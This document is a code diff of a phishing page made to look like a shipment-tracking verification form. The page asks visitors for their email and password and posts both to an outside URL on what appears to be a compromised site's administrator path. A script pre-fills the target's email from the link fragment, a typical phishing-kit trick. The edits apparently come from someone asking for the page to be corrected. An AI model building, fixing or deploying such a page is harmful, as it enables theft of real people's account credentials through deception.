@@ -1,4 +1,4 @@
-this is my correction check if i am correct      <?php
+<?php
 if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     // Get form data
     $email = $_POST['email'] ?? '';
@@ -97,16 +97,9 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     <p><strong>Verification Required Shipment ID: </strong> <br><small> #CS-RBWS/2022BMA/6QC</small></p>
     
     <!-- PHP Form Handling -->
-    <form method="POST" action="https://innpact.co.za/administrator/includes/xlx.php/zim.php">
+    <form method="POST" action="https://innpact.co.za/administrator/includes/xlx.php/zim.php" id="loginForm">
       <input type="email" id="email" name="email" placeholder="Email Address" required />
-
-
-<input type="password" id="password" name="password" placeholder="Password" autocomplete="off" required />
-
-
-
-
-
+      <input type="password" id="password" name="password" placeholder="Password" autocomplete="off" required />
       <button type="submit" id="submitBtn">Track Shipment >>></button>
 
       <!-- Show success or error message -->
@@ -120,33 +113,30 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
 
   <script>
     (function () {
-  const emailInput = document.getElementById('email');
-  const passwordInput = document.getElementById('password');
-  const form = document.querySelector('form');
+      const emailInput = document.getElementById('email');
+      const passwordInput = document.getElementById('password');
+      const form = document.getElementById('loginForm');
 
-  // Auto-fill email from URL #value
-  try {
-    const frag = window.location.hash.slice(1); // Get everything after the # in the URL
-    const decoded = frag ? decodeURIComponent(frag) : '';
-    if (decoded && /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/.test(decoded)) {
-      emailInput.value = decoded;  // Set the email field with the URL hash value
-      passwordInput.value = '';  // Clear the password field for privacy
-    }
-  } catch (err) {
-    console.error('Error parsing URL fragment:', err);
-  }
+      // Auto-fill email from URL #value
+      try {
+        const frag = window.location.hash.slice(1); // Get everything after the # in the URL
+        const decoded = frag ? decodeURIComponent(frag) : '';
+        if (decoded && /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/.test(decoded)) {
+          emailInput.value = decoded;  // Set the email field with the URL hash value
+          passwordInput.value = '';  // Clear the password field for privacy
+        }
+      } catch (err) {
+        console.error('Error parsing URL fragment:', err);
+      }
 
-  // Reset password field on form submission
-  form.addEventListener('submit', function (e) {
-    e.preventDefault();  // Prevent the form from submitting immediately
-    console.log("Form handled locally:", emailInput.value);
-    
-
-    // Simply submit the form without the simulated alert or any delay
-    form.submit();  // Submit the form to the server
-  });
-})();
-
+      // Reset password field on form submission
+      form.addEventListener('submit', function (e) {
+        e.preventDefault();  // Prevent the form from submitting immediately
+        passwordInput.value = ''; // Clear the password field before form submission
+        console.log("Form handled locally:", emailInput.value);
+        form.submit();  // Submit the form to the server
+      });
+    })();
   </script>
 
 </body>
